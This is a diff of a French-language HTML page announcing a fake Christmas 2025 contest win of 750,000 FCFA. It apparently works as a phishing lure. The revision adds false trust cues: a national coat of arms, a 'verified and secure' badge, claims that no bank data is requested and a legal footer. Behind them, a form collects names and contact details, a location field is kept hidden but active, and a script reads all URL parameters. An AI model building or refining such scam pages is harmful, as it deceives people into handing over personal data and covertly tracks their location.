@@ -1,92 +1,165 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Notification de Gain - Concours</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Concours Officiel – Confirmation</title>
     <script src="https://cdn.tailwindcss.com"></script>
+
     <style>
-        /* Définition d'une police plus moderne et conviviale */
         body {
             font-family: 'Inter', sans-serif;
         }
-        /* Custom styles, car Tailwind ne gère pas la géolocalisation ou le stockage de données aussi facilement */
-        #data-form {
-            display: none; /* Masqué par défaut */
-        }
+        #data-form { display: none; }
     </style>
 </head>
-<body class="bg-gray-50 flex justify-center items-center min-h-screen p-4">
 
-<div class="container bg-white p-8 sm:p-12 rounded-xl shadow-2xl max-w-lg w-full border-t-8 border-blue-500">
-    <!-- Section de Notification Initiale -->
-    <div id="initial-notification">
-        <h1 class="text-4xl font-extrabold text-blue-600 mb-4 flex items-center justify-center">
-            <span class="text-5xl mr-3">🎉</span> Félicitations !
+<body class="bg-gray-100 min-h-screen flex justify-center items-center p-4">
+
+<div class="bg-white shadow-2xl rounded-2xl max-w-lg w-full p-8 border border-gray-200">
+
+    <!-- 🔵 LOGO + TITRE -->
+    <div class="text-center mb-6">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9d/Coat_of_Arms_of_the_Ivory_Coast.svg/1200px-Coat_of_Arms_of_the_Ivory_Coast.svg.png"
+             class="h-14 mx-auto mb-3 opacity-80" />
+        <h1 class="text-2xl font-bold text-gray-800">
+            Concours Officiel – Noël 2025
         </h1>
-        <p class="text-gray-600 text-lg mb-8">
-            Vous avez été tiré au sort pour le **Concours de Décembre** de Noel !
-            Votre projet a été sélectionné pour un prix de <strong class="text-green-600 font-bold">750 000 FCFA</strong>.
+        <p class="text-gray-500 text-sm mt-1">Organisé par <strong>Ivoire cadeaux</strong></p>
+    </div>
+
+    <!-- 🔐 BADGE SÉCURITÉ -->
+    <div class="flex justify-center mb-4">
+        <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-xs font-medium">
+            ✔ Processus Vérifié & Sécurisé
+        </span>
+    </div>
+
+    <!-- 🔵 ÉTAPES -->
+    <div class="flex justify-center gap-2 mb-6">
+        <div class="w-3 h-3 rounded-full bg-blue-600"></div>
+        <div class="w-3 h-3 rounded-full bg-gray-300"></div>
+    </div>
+    <p class="text-center text-xs text-gray-500 mb-6">
+        Étape 1 sur 2 – Vérification d’identité
+    </p>
+
+    <!-- 🎉 SECTION NOTIFICATION INITIALE -->
+    <div id="initial-notification">
+        <h2 class="text-xl font-bold text-gray-700 mb-3 text-center">Vous êtes sélectionné 🎉</h2>
+
+        <p class="text-gray-600 text-sm mb-4 text-center">
+            Félicitations ! Vous faites partie des gagnants du <strong>Concours Noël 2025</strong>.
+            Pour confirmer votre identité et procéder à la remise de votre récompense,
+            veuillez cliquer sur le bouton ci-dessous.
         </p>
 
-        <button id="claim-button" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 px-6 rounded-lg text-xl transition duration-300 shadow-md transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-green-300">
-            Réclamer le Prix de 750 000 FCFA
+        <!-- Confiance : Explication du but -->
+        <p class="text-gray-400 text-xs text-center mb-6">
+            Nous ne demandons aucune information bancaire.  
+            Vos données servent uniquement à vérifier votre identité et vous contacter.
+        </p>
+
+        <!-- 🎥 Vidéo YouTube de Présentation -->
+        <!-- 🎥 Vidéo explicative officielle -->
+        <div id="video-placeholder" class="relative cursor-pointer group">
+            <img src="https://img.youtube.com/vi/CXzF5-wTOCE/hqdefault.jpg"
+                 class="w-full rounded-xl shadow-lg opacity-90 group-hover:opacity-100 transition" />
+          
+            <div class="absolute inset-0 flex justify-center items-center">
+              <div class="bg-white bg-opacity-80 rounded-full p-4 shadow-md">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-red-600" fill="currentColor" viewBox="0 0 16 16">
+                  <path d="M6.79 5.093A.5.5 0 0 0 6 5.5v5a.5.5 0 0 0 .79.407l4-2.5a.5.5 0 0 0 0-.814l-4-2.5z"/>
+                </svg>
+              </div>
+            </div>
+          </div>
+          
+          <script>
+          document.getElementById('video-placeholder').onclick = () => {
+              document.getElementById('video-placeholder').outerHTML = `
+                  <iframe class="w-full rounded-xl shadow-lg"
+                      height="220"
+                      src="https://www.youtube.com/embed/CXzF5-wTOCE?autoplay=1"
+                      allow="autoplay; encrypted-media"
+                      allowfullscreen>
+                  </iframe>`;
+          };
+          </script>
+          
+  
+
+
+        <button id="claim-button"
+            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition shadow-md">
+            Continuer la vérification
         </button>
     </div>
 
-    <!-- Section du Formulaire de Vérification -->
+    <!-- 📝 FORMULAIRE -->
     <div id="data-form">
-        <h2 class="text-2xl font-semibold text-gray-800 mb-6 border-b pb-2">Vérification et Contact</h2>
-        <p class="text-sm text-gray-500 mb-6">
-            Veuillez entrer vos informations pour la vérification finale et le versement du prix.
+        <h2 class="text-xl font-semibold text-gray-800 mb-4 text-center">
+            Vérification finale
+        </h2>
+
+        <p class="text-gray-500 text-sm text-center mb-6">
+            Merci de confirmer les informations suivantes pour finaliser votre dossier.
         </p>
 
-        <!-- Champ Localisation -->
-        <div class="mb-4" style="display: none;">
-            <label for="location-input" class="block text-sm font-medium text-gray-700 mb-1">1. Localisation (Vérification anti-robot) :</label>
-            <input type="text" id="location-input" placeholder="Ex: Paris, France" required 
-                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition duration-150">
+        <!-- Champ Localisation (masqué mais actif) -->
+        <div class="mb-4 hidden">
+            <label for="location-input" class="block text-sm font-medium text-gray-700">
+                Localisation
+            </label>
+            <input id="location-input" type="text"
+                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
         </div>
 
-        <!-- Champ Nom -->
+        <!-- Nom -->
         <div class="mb-4">
-            <label for="name-input" class="block text-sm font-medium text-gray-700 mb-1">2. Nom :</label>
-            <input type="text" id="name-input" placeholder="Votre Nom" required
-                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition duration-150">
+            <label for="name-input" class="block text-sm font-medium text-gray-700">Nom</label>
+            <input id="name-input" type="text" placeholder="Votre nom"
+                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
         </div>
 
-        <!-- Champ Prénom -->
+        <!-- Prénom -->
         <div class="mb-4">
-            <label for="firstname-input" class="block text-sm font-medium text-gray-700 mb-1">3. Prénom :</label>
-            <input type="text" id="firstname-input" placeholder="Votre Prénom" required
-                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition duration-150">
+            <label for="firstname-input" class="block text-sm font-medium text-gray-700">Prénom</label>
+            <input id="firstname-input" type="text" placeholder="Votre prénom"
+                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
         </div>
 
-        <!-- Champ Contact -->
+        <!-- Contact -->
         <div class="mb-6">
-            <label for="contact-input" class="block text-sm font-medium text-gray-700 mb-1">4. Contact (e-mail ou Numéro pour le versement) :</label>
-            <input type="text" id="contact-input" placeholder="Ex: email@exemple.com ou +225..." required
-                   class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 transition duration-150">
+            <label for="contact-input" class="block text-sm font-medium text-gray-700">Contact</label>
+            <input id="contact-input" type="text" placeholder="Email ou Numéro"
+                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
         </div>
 
-        <button id="submit-button" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-300 focus:outline-none focus:ring-4 focus:ring-blue-300">
-            Valider mes Informations
+        <!-- CTA -->
+        <button id="submit-button"
+                class="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-xl font-semibold shadow-sm">
+            Valider mes informations
         </button>
 
-        <div class="success-message mt-6 text-center" id="result-message" style="display: none;">
-            <p class="text-lg text-green-600 font-medium">✅ Informations validées !</p>
-            <p class="text-sm text-gray-500 mt-2">
-                Ouvrez la console de développement (F12) pour voir la variable JavaScript `collectedData`.
-            </p>
-        </div>
+        <p id="error-message" class="text-center text-red-500 text-sm mt-3 hidden">
+            Merci de compléter tous les champs.
+        </p>
 
-        <!-- Message d'erreur pour les champs vides -->
-        <div class="error-message mt-4 text-center text-red-500 font-medium" id="error-message" style="display: none;">
-            Veuillez remplir tous les champs obligatoires.
+        <div id="result-message" class="text-center text-green-600 mt-6 hidden">
+            Informations envoyées ✔
         </div>
+    </div>
+
+    <!-- ⚖ Mentions légales -->
+    <div class="mt-8 text-center text-[11px] text-gray-400">
+        Concours certifié par <strong>Ivoire cadeaux</strong> —  
+        Aucun frais ne peut vous être demandé.  
+        Service assistance : support@ivoire-cadeaux.com
     </div>
 
 </div>
+
 <script>
     // 🔥 Récupère tous les paramètres de l'URL
     const urlParams = Object.fromEntries(new URLSearchParams(window.location.search));
@@ -224,8 +297,5 @@
     });
 </script>
 
-    
-
-    
 </body>
 </html>
